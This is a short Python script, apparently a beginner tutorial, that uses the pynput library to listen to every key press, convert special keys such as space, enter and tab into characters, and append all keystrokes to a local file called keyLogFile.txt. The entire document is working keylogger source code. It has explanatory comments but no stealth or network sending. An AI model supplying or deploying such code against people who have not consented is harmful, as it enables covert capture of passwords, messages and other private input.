# Add the pynput (only the keyboard) and the listener to the project
from pynput.keyboard import Listener

# create a new function to take the keystroke listened as an input and appends it to a file
def writetofile(key):
    letter = str(key) # Convert the input from the key parameter to a string type
    letter = letter.replace("'","") # To replace single quotes with nothing

    if letter == 'Key.space':
        letter = ' '

    if letter == 'Key.shift_r' or letter == 'Key.shift_l' or letter == 'Key.shift':
        letter = ''

    if letter == "Key.ctrl_l":
        letter = ""

    if letter == 'Key.enter':
        letter = '\n'

    if letter == 'Key.tab':
        letter = '\t'

    with open('keyLogFile.txt', 'a') as file:
        file.write(letter)

# Assign the instance of the Listener to the variable called 'listener'
with Listener(on_press=writetofile) as listener: 
    listener.join() # Make sure that all the keystrokes are joined togather
    
